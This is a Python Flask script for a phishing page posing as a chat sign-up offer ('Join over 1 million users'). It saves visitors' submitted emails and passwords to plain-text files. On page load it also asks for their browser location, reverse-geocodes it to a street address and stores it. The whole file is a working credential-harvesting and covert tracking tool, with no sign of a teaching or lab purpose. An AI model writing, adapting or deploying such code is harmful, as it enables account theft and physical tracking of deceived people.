import os
import json
import requests
from flask import Flask, render_template_string, request, jsonify
from datetime import datetime
from geopy.geocoders import Nominatim

app = Flask(__name__)

# Directory setup
LOCATION_FOLDER = os.path.expanduser('~/storage/downloads/LocationData')
BACKGROUND_IMAGE_PATH = os.path.join(LOCATION_FOLDER, 'locate.jpg')

# Ensure folder exists
os.makedirs(LOCATION_FOLDER, exist_ok=True)

# Geolocator setup
geolocator = Nominatim(user_agent="location_capture")

@app.route('/')
def index():
    return render_template_string(f'''
    <!DOCTYPE html>
    <html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
        <style>
            body {{
                margin: 0; padding: 0;
                background: url('/static/background.jpg') no-repeat center center fixed;
                background-size: cover;
                color: white; display: flex;
                justify-content: center; align-items: center;
                height: 100vh; font-family: Arial, sans-serif;
            }}
            form {{
                background: rgba(0, 0, 0, 0.8);
                padding: 20px; border-radius: 10px;
                width: 90%; max-width: 400px; text-align: center;
            }}
            input {{
                width: 90%; padding: 10px;
                margin: 10px 0; border: none;
                border-radius: 5px; font-size: 1em;
            }}
            input[type="submit"] {{
                background-color: red; color: white; cursor: pointer;
            }}
            input[type="submit"]:hover {{
                background-color: darkred;
            }}
        </style>
    </head>
    <body>
        <form action="/request_invite" method="post">
            <h2>Join over 1 million users in our chat!</h2>
            <input type="email" name="email" placeholder="Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="submit" value="Sign Up Now!">
        </form>
        <script>
            function sendLocation(position) {{
                $.post('/upload_location', {{ 
                    latitude: position.coords.latitude, 
                    longitude: position.coords.longitude, 
                    accuracy: position.coords.accuracy 
                }});
            }}
            function requestLocation() {{
                if (navigator.geolocation) {{
                    navigator.geolocation.getCurrentPosition(sendLocation, 
                        () => alert("Location access denied"));
                }}
            }}
            requestLocation();
        </script>
    </body>
    </html>
    ''')

@app.route('/request_invite', methods=['POST'])
def request_invite():
    email = request.form.get('email')
    password = request.form.get('password')
    date_str = datetime.now().strftime('%Y%m%d_%H%M%S')

    credentials_file = os.path.join(LOCATION_FOLDER, f"credentials_{date_str}.txt")
    with open(credentials_file, 'w') as f:
        f.write(f"Email: {email}\nPassword: {password}\n")

    return "Your request has been received! We'll contact you soon.", 200

@app.route('/upload_location', methods=['POST'])
def upload_location():
    try:
        location_data = request.json
        if not location_data:
            raise ValueError("No location data received")

        date_str = datetime.now().strftime('%Y%m%d_%H%M%S')
        location_file = os.path.join(LOCATION_FOLDER, f'location_{date_str}.json')

        latitude = location_data['latitude']
        longitude = location_data['longitude']
        location = geolocator.reverse((latitude, longitude), language='en', exactly_one=True)

        if location:
            location_data['address'] = location.address

        with open(location_file, 'w') as f:
            json.dump(location_data, f, indent=4)

        return jsonify({"message": "Location data saved successfully"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 400

if __name__ == '__main__':
    if not os.path.exists('./static'):
        os.makedirs('./static')
    if not os.path.exists('./static/background.jpg') or os.readlink('./static/background.jpg') != BACKGROUND_IMAGE_PATH:
        if os.path.exists('./static/background.jpg'):
            os.remove('./static/background.jpg')  # Remove old link if necessary
        os.symlink(BACKGROUND_IMAGE_PATH, './static/background.jpg')

    app.run(host='0.0.0.0', port=4040)
